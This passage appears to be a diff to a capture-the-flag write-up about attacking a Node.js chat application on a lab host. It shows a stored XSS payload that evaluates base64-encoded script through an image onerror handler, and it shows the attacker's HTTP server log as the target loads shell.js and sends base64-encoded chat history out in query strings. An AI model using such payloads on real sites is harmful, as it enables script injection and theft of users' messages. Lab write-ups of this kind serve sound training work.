@@ -44,3 +44,49 @@ HOP RTT       ADDRESS
 ```
 
 When i analysis this site at port 80, i see it use nodejs, expressjs and auth with jwt.
+`kristenanne`
+
+
+`{"first_name":"a","last_name":"asdf","message":"<img src=x onerror=\"eval(atob('<payload encode base64>'))\">"}`
+
+```shell
+┌──(toan㉿kali)-[~]
+└─$ python -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.11.6 - - [12/Mar/2024 08:05:48] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:05:52] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:05:55] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:05:59] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:06:02] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:06:06] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:06:09] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:06:13] "GET /shell.js HTTP/1.1" 200 -
+10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
+10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
+10.10.11.6 - - [12/Mar/2024 08:08:37] code 501, message Unsupported method ('OPTIONS')
+.....
+```
+
+=>
+```base64
+R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=
+SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=
+```
